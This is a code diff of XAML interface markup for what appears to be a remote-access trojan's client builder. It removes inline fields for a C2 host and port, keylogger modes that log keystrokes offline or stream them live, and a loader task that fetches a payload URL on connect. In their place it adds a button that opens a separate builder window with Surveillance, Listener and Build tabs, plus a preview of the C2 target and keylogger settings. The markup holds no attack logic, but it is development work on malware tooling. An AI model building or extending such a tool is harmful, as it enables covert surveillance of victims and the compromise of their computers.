@@ -526,60 +526,43 @@
                     <RowDefinition Height="*"/>
                 </Grid.RowDefinitions>
 
-                <TextBlock Grid.Row="0" Text="Builder" FontSize="24" FontWeight="SemiBold"
+                <TextBlock Grid.Row="0" Text="Client Builder" FontSize="24" FontWeight="SemiBold"
                            Foreground="{StaticResource TextPrimaryBrush}" Margin="0,0,0,20"/>
 
-                <Border Grid.Row="1" Style="{StaticResource CardBorder}">
-                    <StackPanel>
-                        <!-- C2 config -->
-                        <TextBlock Text="C2 Host" FontSize="12" Foreground="{StaticResource TextSecondaryBrush}" Margin="0,0,0,6"/>
-                        <TextBox Style="{StaticResource ModernTextBox}"
-                                 Text="{Binding BuildHost, UpdateSourceTrigger=PropertyChanged}"
-                                 Margin="0,0,0,16"/>
+                <Border Grid.Row="1" Style="{StaticResource CardBorder}" Padding="28">
+                    <StackPanel MaxWidth="600" HorizontalAlignment="Left">
+                        <TextBlock Text="🔨 Modular Client Builder" FontSize="18" FontWeight="SemiBold"
+                                   Foreground="{StaticResource TextPrimaryBrush}" Margin="0,0,0,8"/>
+                        <TextBlock Text="The Client Builder runs as a dedicated standalone window with separate tabs for Surveillance, Listener, Assembly, and Build."
+                                   FontSize="13" Foreground="{StaticResource TextSecondaryBrush}" TextWrapping="Wrap" Margin="0,0,0,20"/>
 
-                        <TextBlock Text="C2 Port" FontSize="12" Foreground="{StaticResource TextSecondaryBrush}" Margin="0,0,0,6"/>
-                        <TextBox Style="{StaticResource ModernTextBox}"
-                                 Text="{Binding BuildPort, UpdateSourceTrigger=PropertyChanged}"
-                                 Margin="0,0,0,24"/>
-
-                        <!-- Keylogger options -->
-                        <TextBlock Text="Keylogger" FontSize="13" FontWeight="SemiBold"
-                                   Foreground="{StaticResource TextPrimaryBrush}" Margin="0,0,0,10"/>
-
-                        <CheckBox Content="Enable Keylogger"
-                                  IsChecked="{Binding BuildKeyloggerEnabled}"
-                                  Foreground="{StaticResource TextPrimaryBrush}"
-                                  Margin="0,0,0,8"/>
-
-                        <StackPanel Orientation="Horizontal" Margin="0,0,0,24"
-                                    IsEnabled="{Binding BuildKeyloggerEnabled}">
-                            <RadioButton Content="Offline (log to file until retrieved)"
-                                         IsChecked="{Binding BuildKeyloggerOnline, Converter={StaticResource InverseBoolConverter}, Mode=TwoWay}"
-                                         Foreground="{StaticResource TextSecondaryBrush}" Margin="0,0,16,0"/>
-                            <RadioButton Content="Online (stream live)"
-                                         IsChecked="{Binding BuildKeyloggerOnline}"
-                                         Foreground="{StaticResource TextSecondaryBrush}"/>
-                        </StackPanel>
-
-                        <!-- Task on connect -->
-                        <TextBlock Text="Task on Connect" FontSize="13" FontWeight="SemiBold"
-                                   Foreground="{StaticResource TextPrimaryBrush}" Margin="0,0,0,10"/>
-
-                        <CheckBox Content="Enable Loader Task on Connect"
-                                  IsChecked="{Binding BuildTaskEnabled}"
-                                  Foreground="{StaticResource TextPrimaryBrush}"
-                                  Margin="0,0,0,8"/>
-
-                        <TextBlock Text="Payload URL" FontSize="12" Foreground="{StaticResource TextSecondaryBrush}" Margin="0,0,0,6"
-                                   IsEnabled="{Binding BuildTaskEnabled}"/>
-                        <TextBox Style="{StaticResource ModernTextBox}"
-                                 Text="{Binding BuildTaskUrl, UpdateSourceTrigger=PropertyChanged}"
-                                 Margin="0,0,0,24"
-                                 IsEnabled="{Binding BuildTaskEnabled}"/>
+                        <Border Background="{StaticResource BackgroundSecondaryBrush}" BorderBrush="{StaticResource BorderBrush}"
+                                BorderThickness="1" CornerRadius="8" Padding="16" Margin="0,0,0,24">
+                            <StackPanel>
+                                <TextBlock Text="Active Configuration Preview:" FontSize="13" FontWeight="SemiBold"
+                                           Foreground="{StaticResource TextPrimaryBrush}" Margin="0,0,0,8"/>
+                                <TextBlock Foreground="{StaticResource TextSecondaryBrush}" FontSize="12" Margin="0,2">
+                                    <Run Text="• C2 Target: " FontWeight="SemiBold"/>
+                                    <Run Text="{Binding BuildHost}"/>
+                                    <Run Text=":"/>
+                                    <Run Text="{Binding BuildPort}"/>
+                                </TextBlock>
+                                <TextBlock Foreground="{StaticResource TextSecondaryBrush}" FontSize="12" Margin="0,2">
+                                    <Run Text="• Keylogger: " FontWeight="SemiBold"/>
+                                    <Run Text="{Binding BuildKeyloggerEnabled, StringFormat='Enabled: {0}'}"/>
+                                </TextBlock>
+                                <TextBlock Foreground="{StaticResource TextSecondaryBrush}" FontSize="12" Margin="0,2">
+                                    <Run Text="• Binary Size: " FontWeight="SemiBold"/>
+                                    <Run Text="Self-Contained &amp; Trimmed (~11 MB)"/>
+                                </TextBlock>
+                            </StackPanel>
+                        </Border>
 
                         <Button Style="{StaticResource PrimaryButton}"
-                                Content="Build Client" Command="{Binding BuildCommand}"
-                                Height="44" Padding="32,0" HorizontalAlignment="Left"/>
+                                Content="🚀 Open Builder Window"
+                                Command="{Binding OpenBuilderCommand}"
+                                Height="44" Padding="28,0" HorizontalAlignment="Left"
+                                FontSize="14" FontWeight="SemiBold"/>
                     </StackPanel>
                 </Border>
             </Grid>
